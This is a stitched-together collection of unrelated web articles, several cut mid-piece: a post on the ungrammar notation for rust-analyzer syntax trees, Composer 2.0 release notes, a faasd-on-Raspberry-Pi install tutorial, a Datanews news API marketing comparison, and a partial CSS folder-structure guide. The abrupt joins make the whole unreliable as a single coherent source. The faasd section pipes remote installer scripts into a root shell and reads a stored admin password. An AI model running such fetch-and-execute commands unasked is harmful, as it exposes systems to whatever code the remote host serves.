<p>So, what exactly does “describing syntax trees” mean and why is it useful?
When writing an IDE, one of the core data structure is the concrete syntax tree.
It is a full-fidelity tree which represents the original source code in detail, including parenthesis, comments, and whitespace.
CSTs are used for initial analysis of the language.
They are also a vocabulary type for refactors.
Although the ultimate result of a refactor is a text diff, tree modification is a more convenient internal representation.</p>

<p>At the lowest level, the CST is typically unityped: there’s some <code>Node</code> superclass, which has a collection of <code>Node</code> children and an optional <code>Node</code> parent.
On top of this raw layer, a more AST-like API is provided: <code>Struct</code> has a <code>.name()</code> and a list of <code>.fields()</code>, etc.
This typed API is huge!
For rust-analyzer, it is comprised of more than 130 <em>types</em>!
And it is also more detailed than a typical AST: <code>Struct</code> also has <code>.l_curly()</code> and <code>.r_curly()</code>.</p>
<p>What’s worse, this API changes a lot, especially at the beginning.
You may start with nesting <code>.fields()</code> directly under the <code>Struct</code>, but then introduce a <code>StructFields</code> node for everything between the curly braces to share the code with enum variants.</p>
<p>In short, writing this by hand sucks :-)
Ungrammar is a notation to concisely describe the structure of the syntax tree, which can be used by a code generator to build an API in the target language.
If you’ve heard about <a href="https://www.oilshell.org/blog/2016/12/11.html">ASDL</a>, ungrammar is ASDL for concrete syntax trees.
For rust-analyzer’s case, that means taking the following input:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>Module =
  Attr* Visibility?
  'mod' Name
  (ItemList | ';')
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>And generating the following output:</p>
<div>
<div>
<pre><code data-lang="rust"><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>impl</span> <span>ast</span><span>::</span><span>AttrsOwner</span>      <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>VisibilityOwner</span> <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>ast</span><span>::</span><span>NameOwner</span>       <span>for</span> <span>Module</span> <span>{}</span>
<span>impl</span> <span>Module</span> <span>{</span>
    <span>pub</span> <span>fn</span> <span>mod_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>item_list</span><span>(</span><span>&amp;</span><span>self</span><span>)</span>       <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>ItemList</span><span>&gt;</span>    <span>{</span> <span>...</span> <span>}</span>
    <span>pub</span> <span>fn</span> <span>semicolon_token</span><span>(</span><span>&amp;</span><span>self</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>SyntaxToken</span><span>&gt;</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>In typical parser generators, something similar can be achieved by generating <em>both</em> the parser and the syntax tree from the same grammar.
This works to some extent, but has an inherent problem that the shape of the tree you want for the programmatic API, and the shape of the grammar you need to implement the parser are often different.
“Technical” transformations like left-recursion elimination don’t affect the language described by the grammar, but completely change the shape of the parse tree.
In contrast, ungrammar focuses solely on the second task, which radically reduces the complexity of the grammar.
In rust-analyzer, it is paired with a hand-written parser.</p>
<p>Treated as an ordinary (context free) grammar, ungrammar describes a superset of the language.
For example, for programmatic API it might be convenient to treat commas in comma-separate lists as a part of the list element
(rust-analyzer doesn’t do this yet, but it should).
This leads to the following ungrammar, which obviously doesn’t treat commas precisely:</p>
<div>
<div>
<pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>FieldList =
  '{' Field* '}'

Field:
  Name ':' Type ','?
</pre></td></tr></tbody></table></code></pre>
</div>
</div>
<p>Similarly, ungrammar defines binary and unary expressions, but doesn’t specify their relative precedence and associativity.</p>
<p>An interesting side-effect is that the resulting grammars turn out to be pretty human readable.
For example, a full production ready Rust grammar takes about 600 short lines:<br></p>

<p>This might be a good fit for reference documentation!</p>

                <div>
                    <h2 id="1-what-s-new">1/ What's new?</h2><p>The list of changes and improvements is long, check the <a href="https://github.com/composer/composer/releases/tag/2.0.0">complete changelog</a> if you are interested in reading it all. I will highlight a few key points here.</p><h3 id="performance-improvements">Performance improvements</h3><p>We overhauled pretty much everything from the protocol used between Composer and packagist.org to the dependency resolution, including downloading files in parallel using curl and constraint evaluation optimizations. This leads to massive improvements in terms of both speed and memory usage. The difference depends on your use case, so while I've seen reports of improvements of over 50% to both in some projects, I cannot put an exact number on it. But I am sure you will be positively surprised if you haven't tried Composer 2 yet.</p><p>As a side note to this, <code>require</code>/<code>remove</code> and partial updates are now much faster because Composer will now only load the metadata of the packages which are being changed.</p><figure><img src="https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png" alt="" srcset="https://blog.packagist.com/content/images/size/w600/2020/10/image_2020-10-24_175318.png 600w, https://blog.packagist.com/content/images/size/w1000/2020/10/image_2020-10-24_175318.png 1000w, https://blog.packagist.com/content/images/2020/10/image_2020-10-24_175318.png 1455w" sizes="(min-width: 1200px) 1200px"><figcaption>Time for initial update + install (bootstrapped project, empty cache) shows roughly 60% less time used by Composer 2 with ext-curl enabled</figcaption></figure><h3 id="architectural-changes-and-determinism">Architectural changes and determinism</h3><p>The way dependency updates are done internally was refactored, which, for you, will result in more deterministic updates. The current local state of the vendor directory will not interfere in updates anymore. </p><p>After an update is complete, the install process is run automatically and it will now execute all network bound operations first - and in parallel if possible. This will avoid leaving you with a half-updated vendor directory if a network error occurs midway through installation.</p><h3 id="runtime-features">Runtime features</h3><p>We added a <a href="https://getcomposer.org/doc/07-runtime.md#platform-check">platform-check step</a> when <code>vendor/autoload.php</code> gets initialized which checks the current PHP version/extensions match what is expected by your dependencies and fails hard otherwise.</p><p>There is a new class, <code>Composer\InstalledVersions</code>, which is autoloaded in every project and is available at runtime. It allows you to check which packages/versions are present at runtime of your own project.</p><p>See the <a href="https://getcomposer.org/doc/07-runtime.md">runtime docs</a> for more details.</p><p>If your code relies on any of these runtime features, you should require <code>"composer-runtime-api": "^2.0"</code> in your composer.json. This is a virtual package which is provided by Composer and will make sure people have to use Composer 2.x to install your package.</p><h3 id="error-reporting-improvements">Error reporting improvements</h3><p>Because things don't always go the way they're supposed to, we made sure to improve the error reporting shown to you when dependencies cannot be resolved. It's hard to give concrete examples here as there are a million ways this can fail but you will hopefully notice that messages are now shorter, clearer and less repetitive.</p><h3 id="partial-updates-with-temporary-constraints">Partial updates with temporary constraints</h3><p>Sometimes it can be useful to upgrade or downgrade a single package to a specific version, perhaps temporarily to test something or wait for a bug fix. You can now run <code>composer update vendor/package:1.0.*</code> for example (or <code>1.0.12</code> or any other version constraint), to run an update of only <code>vendor/package</code> to a version matching this additional constraint. This will not update your require in composer.json, and it will not mark the lock file out of date.</p><p>If you want to add/restrict a constraint but still do a full update of all dependencies, you can use <code>update --with vendor/package:1.0.*</code> which will run the update with that additional constraint.</p><h2 id="2-how-easy-is-it-to-upgrade">2/ How easy is it to upgrade?</h2><p>Our goal is that every Composer user can upgrade smoothly and swiftly. The gains are huge and we want everyone to benefit from them. To achieve that we did a few things:</p><ul><li>Composer 2.0 still supports PHP 5.3 and above, much like Composer 1.x</li><li><code>composer.lock</code> files are interoperable between versions, so you can upgrade to 2.0 and roll back easily if needed.</li><li>Most commands and arguments remain the same, and largely what you know about Composer remains true in 2.0.</li></ul><p>If you run <code>composer self-update</code> from 1.x, it will warn you that a new stable major version of Composer is available, and you can use <code>composer self-update --2</code> to migrate to it.</p><p>Should you encounter issues, you can go back at any time by using <code>composer self-update --1</code>. Hopefully that will make everyone feel comfortable to experiment with the new release.</p><p>If you are <a href="https://getcomposer.org/doc/faqs/how-to-install-composer-programmatically.md">installing Composer automatically</a> from the installer script, and wish to remain on Composer 1.x for the time being, you can also pass it a <code>--1</code> argument to prevent it from installing Composer 2.0 by default. If you do this please remember and aim to upgrade in a timely manner, as Composer 1.x will not be maintained for very long.</p><h2 id="3-backwards-compatibility-breaks">3/ Backwards compatibility breaks?</h2><p>Here are the main things likely to cause trouble with the upgrade process:</p><ul><li><strong>Plugins</strong>: This is probably going to be the major source of problems for most people. Plugins need to be updated to support Composer 2, and some of them are not ready, yet. Composer 2 will complain and fail to resolve dependencies if a plugin does not support it, so no need to overthink it, you can try it out and see how it goes.</li><li>The new <strong>platform-check feature</strong> means that Composer checks the runtime PHP version and available extensions to ensure they match the project dependencies. If a mismatch is found, the autoloader exits with error details to make sure problems are not overlooked. To avoid issues when deploying to production it is recommended to run <code>composer check-platform-reqs --no-dev</code> with the production PHP process as part of your build or deployment process.</li><li><strong>Repository priority</strong>: If a package exists in a higher priority repository, it will now be entirely ignored in lower priority repositories. If you seem to be missing packages when using Composer 2, see <a href="https://getcomposer.org/repoprio">repository priorities docs</a> for details.</li><li><strong>Invalid PSR-0 / PSR-4 configurations</strong> will not autoload anymore in optimized-autoloader mode, as per the warnings introduced in Composer 1.10. Mostly these warnings were for classes that were not meant to autoload anyway so I don't expect major issues, but it's safer to clean these up before upgrading.</li></ul><p>If you want to know more, I would highly recommend reading the <a href="https://github.com/composer/composer/blob/master/UPGRADE-2.0.md">UPGRADE</a> guide which has multiple sections for end users, plugin authors and Composer repository implementors.</p><h2 id="4-what-s-next">4/ What's next?</h2><p>We don't have a very detailed feature roadmap anymore as 2.0 contains tons of new goodies, but one important thing I want to explain is our PHP version support going forward.</p><p>As I mentioned above, Composer 2.0 supports PHP 5.3+, which is at this point very outdated and makes the code quite hard to maintain in places. We went through the effort to make sure every Composer user can upgrade to Composer 2, but the plan is to drop support for EOL PHP versions in a future minor release.</p><p>Composer 2.1 might still come with PHP 5.3 support, depending on the timeline and which features end up being included, but then at the latest by Composer 2.2 we will drop support for everything older than PHP 7.1.3. According to our stats this allows over 90% of the Composer users to use the latest version, and for the others who are stuck on outdated PHP versions we will keep providing critical bug and security fixes in the 2.0.x or 2.1.x range.</p><p>As for Composer 1.x, it is now more or less EOL. It will also receive critical fixes if anything comes up but the goal for everyone should be to migrate to 2.x as soon as possible.</p><p>Finally I want to thank everyone who contributed and helped make this a reality. The 2.0 release represents over 1100 commits from 28 people, 150+ GitHub issues and pull requests, plus everyone who test it, reviewed PRs, etc. It has been a huge effort with the first commits made about two years ago.</p><p>I also want to thank all our <a href="https://packagist.com/">Private Packagist</a> customers who helped finance this effort and afforded us the time we spent on all this. We sincerely hope everyone will appreciate the result!</p>

        <section>
            <div><p>Kick the tires with faasd today, for a lightweight serverless experience that doesn't require Kubernetes. Instead it uses containerd and the existing OpenFaaS ecosystem.</p>
<blockquote>
<p>Last updated: 24th October 2020 - upgraded faasd &amp; containerd versions. Added instructions for core components logs such as the gateway.</p>
</blockquote>
<p>You can run <a href="https://github.com/openfaas/faasd">faasd</a> anywhere, even on a <a href="https://www.raspberrypi.org/">Raspberry Pi</a>, but why would you want to do that? faasd offers many of the benefits of containers and <a href="https://github.com/openfaas/faas">OpenFaaS</a>, but without the complexity and operational costs of Kubernetes. <a href="https://github.com/containerd/containerd">containerd</a> is a low-level tool for automating containers, and a <a href="https://landscape.cncf.io/">CNCF project</a>.</p>
<p><img src="https://blog.alexellis.io/content/images/2019/12/ofctr.png" alt="OpenFaaS and containerd logos"></p>
<p>The use-cases for <a href="https://blog.alexellis.io/introducing-functions-as-a-service/">Serverless / FaaS are fairly well-known</a>, but you could use faasd at the edge, in a smart-car, as part of an IoT device, for crunching data before uploading samples to the cloud, for webhook receivers/alerting, bots, webservices, API integrations or even providing your own APIs. Compute is compute, and OpenFaaS with containerd makes it easy to both consume and provide.</p>
<blockquote>
<p>🚀 Support the development of faasd - <a href="https://github.com/sponsors/openfaas">Sponsor OpenFaaS on GitHub</a><br>
⭐️ Star or fork <a href="https://github.com/openfaas/faasd">faasd on GitHub</a></p>
</blockquote>
<h2 id="beforewestart">Before we start</h2>
<p>Use Raspbian Lite (now called RaspiOS) for this tutorial. Do not install Docker on the same Raspberry Pi as it may cause conflicts with networking and the version of containerd we are using.</p>
<p>You should use RPi 2, 3 or 4. If you have only one Raspberry Pi, then you'll be able to deploy pre-built images from the OpenFaaS Function Store, but if you have a second Raspberry Pi, then you can use it to build new functions too.</p>
<p>You can also deploy to a PC or cloud VM:</p>
<ul>
<li><a href="https://www.openfaas.com/blog/faasd-tls-terraform/">Deploy faasd to DigitalOcean with Terraform</a></li>
<li><a href="https://github.com/openfaas/faasd/blob/master/docs/MULTIPASS.md">Deploy faasd to your laptop with Multipass</a></li>
</ul>
<h2 id="installation">Installation</h2>
<p>Installation only takes a few moments, and in the future should be quicker if we can secure binaries for containerd from the upstream project.</p>
<h3 id="getfaascli">Get <code>faas-cli</code></h3>
<p>The <a href="https://github.com/openfaas/faas-cli/">faas-cli</a> can be used to build, deploy, manage, and invoke functions with OpenFaaS. OpenFaaS offers a REST API, asynchronous invocations, authentication, metrics, and a UI out of the box.</p>
<p>Install using the utility script, or alternatively the binaries are also available on the <a href="https://github.com/openfaas/faas-cli/releases">releases page</a>.</p>
<pre><code># Install to local directory
curl -sLfS https://cli.openfaas.com | sh
sudo mv faas-cli to /usr/local/bin

# Or run with sudo to move to /usr/local/bin in one step
curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<p>See also: <a href="https://docs.openfaas.com/">OpenFaaS docs</a></p>
<h3 id="getcontainerd">Get containerd</h3>
<p>Unfortunately the <a href="https://github.com/containerd/containerd">containerd</a> maintainers only provide binaries for <code>x86_64</code> (regular PCs), so we have to install Go and build containerd from source.</p>
<p>We'll install some dependencies that will help us in the tutorial and after installation</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    runc \
    bridge-utils \
    tmux \
    git
</code></pre>
<p>Pick option A or B.</p>
<h4 id="ausemycontainerdarmhfbinariesfast">A) Use my containerd armhf binaries (fast)</h4>
<p>I have compiled binaries for containerd, which you can use if you wish. <a href="https://github.com/alexellis/containerd-armhf/releases">alexellis/containerd/armhf</a>.</p>
<pre><code>curl -sSL https://github.com/alexellis/containerd-arm/releases/download/v1.3.5/containerd-1.3.5-linux-armhf.tar.gz | sudo tar -xvz --strip-components=1 -C /usr/local/bin/
</code></pre>
<h4 id="bbuildyourowncontainerdbinariesslow">B) Build your own containerd binaries (slow)</h4>
<p>Raspbian needs a few additional build-time dependencies for containerd:</p>
<pre><code>sudo apt update \
  &amp;&amp; sudo apt install -qy \
    build-essential \
    libbtrfs-dev \
    libseccomp-dev
</code></pre>
<p>You can use my utility script to build containerd now:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas
git clone https://github.com/openfaas/faasd

cd cd faasd

./hack/build-containerd-armhf.sh
</code></pre>
<p>This could take a few moments on RPi2 or 3, and is a little quicker on RPi4.</p>
<h3 id="configurecontainerdtostartonboot">Configure containerd to start on boot</h3>
<p>Install a systemd unit file for <code>containerd</code>:</p>
<pre><code>curl -SLfs https://raw.githubusercontent.com/containerd/containerd/v1.3.5/containerd.service | sudo tee /etc/systemd/system/containerd.service

sudo systemctl enable containerd
sudo systemctl start containerd
</code></pre>
<p>Check that <code>containerd</code> started with <code>sudo systemctl status containerd</code>, if not then you may need to <code>unmask</code> it and run the commands again. See <a href="https://blog.ruanbekker.com/blog/2017/12/09/unmask-a-masked-service-in-systemd/">unmasking a service</a>.</p>
<h3 id="installnetworking">Install networking</h3>
<ul>
<li>
<p>Enable the Kernel's bridge module</p>
<pre><code># One-off
sudo modprobe br_netfilter &amp;&amp; \
sudo sysctl net.bridge.bridge-nf-call-iptables=1

# Make it permanent
echo "br_netfilter" | sudo tee -a /etc/modules-load.d/modules.conf

echo "net.bridge.bridge-nf-call-iptables=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
</li>
<li>
<p>Install CNI plugins</p>
<p>Fortunately there are upstream ARM binaries available for the CNI plugins.</p>
<pre><code>sudo mkdir -p /opt/cni/bin

curl -sSL https://github.com/containernetworking/plugins/releases/download/v0.8.5/cni-plugins-linux-arm-v0.8.5.tgz | sudo tar -xz -C /opt/cni/bin
</code></pre>
</li>
<li>
<p>Enable NAT</p>
<p>Enable NAT between the container network and your wider network and the Internet:</p>
<pre><code>sudo /sbin/sysctl -w net.ipv4.conf.all.forwarding=1

echo "net.ipv4.conf.all.forwarding=1" | sudo tee -a /etc/sysctl.conf
</code></pre>
<p>Optional step - if you have Docker running on your system, then disable it and reboot at this point.</p>
<pre><code>sudo systemctl disable docker
sudo systemctl disable docker.sock # or docker.socket - You may also need this step
</code></pre>
<p>Docker's IP address range conflicts with the one chosen by netns, this will be resolved when moving to CNI.</p>
</li>
</ul>
<h3 id="getfaasd">Get <code>faasd</code></h3>
<p>faasd is a Go binary that runs on your system and packages all of OpenFaaS, it's a similar tool to docker-compose.</p>
<p>One of faasd's commands <code>faasd provider</code> runs an OpenFaaS provider which implements the OpenFaaS "CRUD" API for functions.</p>
<p>Clean-up old versions, if required:</p>
<pre><code># Stop systemd services, if you have them
sudo systemctl stop faasd
sudo systemctl stop faasd-provider

# Remove old binaries if you have them
sudo rm -rf /usr/local/bin/faasd
</code></pre>
<p>Download the faasd binary:</p>
<pre><code>sudo curl -sSLf "https://github.com/openfaas/faasd/releases/download/0.9.5/faasd-armhf" \
    --output "/usr/local/bin/faasd" \
    &amp;&amp; sudo chmod a+x "/usr/local/bin/faasd"
</code></pre>
<p>Now run the installation:</p>
<pre><code>export GOPATH=$HOME/go/
mkdir -p $GOPATH/src/github.com/openfaas
cd $GOPATH/src/github.com/openfaas

git clone https://github.com/openfaas/faasd --depth=1

cd faasd

sudo faasd install
</code></pre>
<h2 id="postinstall">Post-install</h2>
<p>The <code>faasd install</code> command creates two systemd unit files which can be used to start/stop <code>faasd</code> and <code>faasd-provider</code>.</p>
<h3 id="checktheinstallation">Check the installation</h3>
<p>Check the services:</p>
<pre><code>sudo systemctl status faasd
sudo systemctl status faasd-provider
</code></pre>
<p>Find logs:</p>
<pre><code>sudo journalctl -u faasd --lines 40
sudo journalctl -u faasd-provider --lines 40
</code></pre>
<p>You'll find your login details for the gateway in <code>/var/lib/faasd/secrets</code>, the user is <code>admin</code> and the password is in <code>/var/lib/faasd/secrets/basic-auth-password</code></p>
<h3 id="checkthelogsfromtheopenfaascoreservices">Check the logs from the OpenFaaS Core Services</h3>
<p>You can access the logs from any of the core services deployed with faasd as follows:</p>
<pre><code>sudo journalctl -t default:gateway --lines 40
sudo journalctl -t default:nats --lines 40
sudo journalctl -t default:queue-worker --lines 40
sudo journalctl -t default:prometheus --lines 40
</code></pre>
<p>For more, see the <code>docker-compose.yaml</code> file in the current directory.</p>
<h3 id="accessopenfaasfromyourlaptop">Access OpenFaaS from your laptop</h3>
<p>faasd deploys OpenFaaS along with its core logic <code>faasd-provider</code>, which uses containerd instead of Kubernetes to start, stop, and manage functions.</p>
<p>The <code>faasd</code> process will proxy any incoming requests on HTTP port 8080 to the OpenFaaS gateway container, you can also find the IP of the container in your <code>hosts</code> file in the <code>faasd</code> directory.</p>
<p>You can also access the built-in Prometheus container by editing <code>docker-compose.yaml</code> to expose its ports, either to 127.0.0.1, or all your network adapters.</p>
<h3 id="deployafunctionfromthestore">Deploy a function from the store</h3>
<p>Obtain your OpenFaaS password. You need to run this command on your Raspberry Pi:</p>
<pre><code>sudo cat /var/lib/faasd/secrets/basic-auth-password
</code></pre>
<p>Log in to the gateway, either on your RPi, or from your own computer.</p>
<pre><code># If connecting remotely
export IP=192.168.0.101
export OPENFAAS_URL=http://$IP:8080
echo $PASSWORD | faas-cli login

# Or on device:

sudo cat /var/lib/faasd/secrets/basic-auth-password | faas-cli login --password-stdin
</code></pre>
<p>Look at what's available in the function store for the armhf platform, then deploy something:</p>
<pre><code>faas-cli store list --platform armhf

# Deploy figlet
faas-cli store deploy --platform armhf figlet

# Find the URLs for the function
faas-cli store inspect figlet

# Create some ASCII

echo "faasd" | faas-cli invoke figlet
</code></pre>
<p>Try a function that can generate an <code>identicon</code> like you may have seen for default avatar logos on GitHub.com</p>
<pre><code>faas-cli store deploy --platform armhf identicon

echo $USER | faas-cli invoke identicon &gt; avatar.png
</code></pre>
<p>Here's an example of the avatar for the user <code>pi</code>:</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/avatar.png" alt="avatar"></p>
<h3 id="runanasyncfunction">Run an async function</h3>
<p>You can also run your functions in the background or asynchronously.</p>
<p>Create a webhook receiver using a public service such as:</p>
<ul>
<li><a href="https://requestbin.com/">https://requestbin.com/</a></li>
<li><a href="https://postb.in/">https://postb.in/</a></li>
</ul>
<pre><code>faas-cli store deploy --platform armhf nodeinfo

curl -d "verbose" \
  http://127.0.0.1:8080/async-function/nodeinfo \
  --header "X-Callback-Url: https://postb.in/1578562711776-8760500776115"
</code></pre>
<p>You'll be able to refresh your webhook receiver and see the value.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/01/Screenshot-2020-01-09-at-09.41.11.png" alt="Screenshot-2020-01-09-at-09.41.11"></p>
<h3 id="buildanewcontainerimage">Build a new container image</h3>
<p>You'll need a second Raspberry Pi for this step since we do not have <code>docker</code> installed on the device.</p>
<p>There are a couple of workarounds if you don't have a second device: use buildkit per as my post <a href="https://blog.alexellis.io/building-containers-without-docker/">Building containers without Docker</a>. Or build on your PC using <a href="https://github.com/alexellis/multiarch-templates">one of my multi-arch templates</a>.</p>
<p>You can also use one of my prebuilt functions such as <a href="https://github.com/alexellis/2020/">ascii-2020</a>, but you should only run the <code>faas-cli deploy</code> step.</p>
<ul>
<li>
<p>Log into the Raspberry Pi with <code>ssh</code> and install the <code>faas-cli</code> and <code>docker</code>.</p>
<pre><code>curl -sLfS https://cli.openfaas.com | sudo sh
</code></pre>
<pre><code>curl -sLfS https://get.docker.com | sudo sh

sudo usermod -aG docker pi
newgrp
</code></pre>
</li>
<li>
<p>Log into the Docker Hub</p>
<pre><code>docker login
</code></pre>
</li>
<li>
<p>Create a Golang function</p>
<pre><code>export DOCKER_HUB_NAME="alexellis2"

faas-cli template store pull golang-middleware

faas-cli new --lang golang-middleware \
  hello-world \
  --prefix $DOCKER_HUB_NAME
</code></pre>
</li>
<li>
<p>Now build and push the image</p>
<pre><code>faas-cli push -f hello-world.yml
faas-cli deploy -f hello-world.yml
</code></pre>
</li>
</ul>
<h3 id="deployyournewcontainer">Deploy your new container</h3>

              For the most basic use cases <a href="https://news.google.com/">Google News</a> or <a href="https://www.google.com/alerts">Google Alerts</a> may be enough, but both of these services have many limitations that prevent them from being used on a bigger scale.
            </p>
            <p>
              Unfortunately Google News does not provide a convenient way to retrieve a big amount of relevant data, as it poses a strict limit on the number of articles that could be retrieved per query. Yet another concern is rate limiting restrictions. Google News is primarily focused on human users, not robots, therefore you risk getting your ip banned when trying to make a large amount of queries programmatically.
            </p>
            <p>
              The search interface is also far from perfect, as it does not allow building complex queries, in contrast to
              <a href="https://www.elastic.co/what-is/elasticsearch">modern full-text search storage solutions</a>, which provide a wide variety of operators for building search queries of almost any complexity.

            <p>
              Let’s go over the main features and make a side-by-side comparison with Google News.
            </p>

            <ul>
              <li>

                <!-- Text -->
                <h3>
                  Maximum number of articles returned per query.
                </h3>

                <ul>
                  <li>
                    Google News has a max limit of <span>100</span> articles per query without any possibility to retrieve more. This may be a big limitation if the search keyword is very popular and may contain thousands or even tens of thousands of relevant articles.
                  </li>
                  <li>
                    In contrast, Datanews News API provides access to <span>all of the relevant articles whenever they were published</span>. The API uses
                    <a href="https://en.wikipedia.org/wiki/Pagination">pagination</a> for efficient transfer of a large amount of articles through the network.
                  </li>
                </ul>
              </li>

              <li>

                <!-- Text -->
                <h3>
                  Available news article metadata.
                </h3>

                <ul>
                  <li>
                    Google News provides a limited amount of metadata about each particular article. It usually includes the publication date, description field, title and the original article link.
                  </li>
                  <li>
                    Datanews API returns more additional information about each article, which is directly extracted from webpage: original article link, title, description, publication date, domain of the publication, url of the image on the article page, <span>list of authors</span>, language, country, <span>snippet of the content</span>.
                  </li>
                </ul>

                <p>Above information is much more useful for use cases such as data collection or public relations. Analyzing authors of the articles on the large scale allows PR firms to work more efficiently, as they will have more context about authors and journalists.</p>

                    Google News has many <a href="https://github.com/DatanewsOrg/google-news-js">unofficial implementations of client libraries</a> for accessing it’s content. Although, none of them really goes past limitations mentioned above.</li>

              Choosing between <a href="https://news.google.com/">Google News</a> and other News API is really about your use case. If you need something simple just for personal use, then going with Google News or Google Alerts will make perfect sense.
            </p>
            <p>
              Otherwise, if you plan to build some software system with bigger scale, then going with an existing news API provider like <a href="https://datanews.io/">Datanews</a> will make more sense. It will provide you with a reliable and complete news monitoring solution that is ready to be integrated into your product.

	    	    				    		      	    	<p>When it comes to structuring CSS, there is no shortage of different naming conventions, methodologies, and architectures. Be it <a href="http://getbem.com/">BEM</a>, <a href="https://github.com/stubbornella/oocss/wiki">OOCSS</a>, <a href="http://smacss.com/">SMACSS</a>, <a href="https://www.creativebloq.com/web-design/manage-large-css-projects-itcss-101517528">ITCSS</a>, or <a href="https://piccalil.li/cube-css/">CUBE CSS</a> – over the last years, many different approaches to managing modular CSS have emerged. Some are offering strategies on how to split CSS into smaller, more manageable pieces, while others focus more on naming conventions for classes. Sometimes, it can be hard to grasp where the differences or advantages of certain methodologies lie, yet in the end, they all aim at the same: Providing structure and consistency, also known as “avoiding a mess”, when you are working in a team or with your present and future self.</p>

<p>No wonder there isn’t a new project where I don’t start to think about the structure of my CSS a bit and, over time, the way I organize and write CSS has changed a lot. The biggest change came when we all started to write CSS for components. But also preprocessors like Sass have clearly left their mark.</p>

<p>In this post, I will share my current take on CSS structure. It does not religiously follow any particular methodology, although people familiar with <a href="https://www.creativebloq.com/web-design/manage-large-css-projects-itcss-101517528">Harry Roberts’ ITCSS</a> (“Inverted Triangle CSS”) will definitely recognize parts of his methodology. If you haven’t yet looked at ITCSS, I highly recommend it. What I like most, is the pragmatic, real-life approach and the principle of structuring your CSS in a way that gets ever more specific and explicit the farther down you go in the structure. This allows you to focus on the high-level styles first and makes it easier to deal with the cascade, inheritance, and selector specificity while keeping the number of classes – and the specificity! – as low as possible. There are, however, a few differences, and this is also what I’d suggest to anyone setting up their own structure: Take any methodology with a grain of salt and freely adjust it to your needs and the way you work.</p>

<h2>The Folder Structure</h2>

<p>This is how my folder structure currently looks like:</p>

														
	    	    							    	<pre><code>
/scss/
├── 1-settings
├── 2-design-tokens
├── 3-tools
├── 4-generic
├── 5-elements
├── 6-skeleton
├── 7-components
├── 8-utilities
├── _shame.scss
└── main.scss
</code>
</pre>
											
	    	    				    		      	    	<p>Let’s break it down a bit.</p>

<h3>Settings</h3>

<p>The first folder, <code>1-settings</code>, is for all general project settings, so for the most basic high-level configuration. This might be a collection of global variables – either as Sass variables or custom properties.</p>

														
	    	    							    	<pre><code>
├── 1-settings
│&nbsp;&nbsp; └── _global.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Design Tokens</h3>

<p>The second folder is for all styles regarding the visual vocabulary of the site. At this level, we are still not generating any CSS output. It is where we define variables for the typography, colors, spacing, media-queries, or any other attributes which you will use throughout the design. For these visual design attributes, the term <em>design tokens</em> has taken hold. Those design tokens could even be coming from your design system as a single source of truth.</p>

														
	    	    							    	<pre><code>
├── 2-design-tokens
│&nbsp;&nbsp; ├── _colors.scss
│&nbsp;&nbsp; ├── _fonts.scss
│&nbsp;&nbsp; ├── _media-queries.scss
│&nbsp;&nbsp; ├── _spacing.scss
│&nbsp;&nbsp; └── _typography.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Tools</h3>

<p>The tools folder is where your global Sass mixins and functions live. Maybe you want to manipulate colors with blend modes or set the aspect ratio for a video container? Or clear your float, for example. I am not a heavy user of mixins myself, but I know many people who love them, so this is where to put them.</p>

														
	    	    							    	<pre><code>
├── 3-tools
│&nbsp;&nbsp; ├── _aspect-ratio.scss
│&nbsp;&nbsp; ├── _blend-modes.scss
│&nbsp;&nbsp; ├── _center.scss
│   ├── _clearfix.scss
│&nbsp;&nbsp; └── _gradients.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Generic</h3>

<p>Just like in ITCSS, the generic folder is the first one that actually produces CSS. It contains global box-sizing rules, CSS resets, or print styles – anything that should be set right at the beginning of your CSS but isn’t yet project-specific.</p>

														
	    	    							    	<pre><code>
├── 4-generic
│&nbsp;&nbsp; ├── _box-sizing.scss
│&nbsp;&nbsp; ├── _font-face.scss
│&nbsp;&nbsp; ├── _normalize.scss
│&nbsp;&nbsp; └── _print.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Elements</h3>

<p>Now that the most basic things are set up, we can start to style the building blocks of our front-end: Raw HTML Elements. Mostly without classes, we are now redefining the basic browser styles of headlines, buttons, links, lists, etc. and can make sure that all components in our design are using the same consistent base.</p>

														
	    	    							    	<pre><code>
├── 5-elements
│&nbsp;&nbsp; ├── _forms.scss
│&nbsp;&nbsp; ├── _headings.scss
│&nbsp;&nbsp; ├── _images.scss
│&nbsp;&nbsp; ├── _links.scss
│&nbsp;&nbsp; └── _lists.scss
│&nbsp;&nbsp; ├── ...
</code>
</pre>
											
	    	    				    		      	    	<h3>Skeleton</h3>

<p>Any modern web project that is built with components also comes with the need for a higher-level structure in which all the components can live: Wrappers, containers, grids, and all kinds of reusable objects that provide layout patterns. This is the skeleton of your site.</p>

														
	    	    							    	<pre><code>
├── 6-skeleton
│&nbsp;&nbsp; ├── _grid.scss
│&nbsp;&nbsp; ├── _layouts.scss
│&nbsp;&nbsp; └── _objects.scss
</code>
</pre>
											
	    	    				    		      	    	<h3>Components</h3>

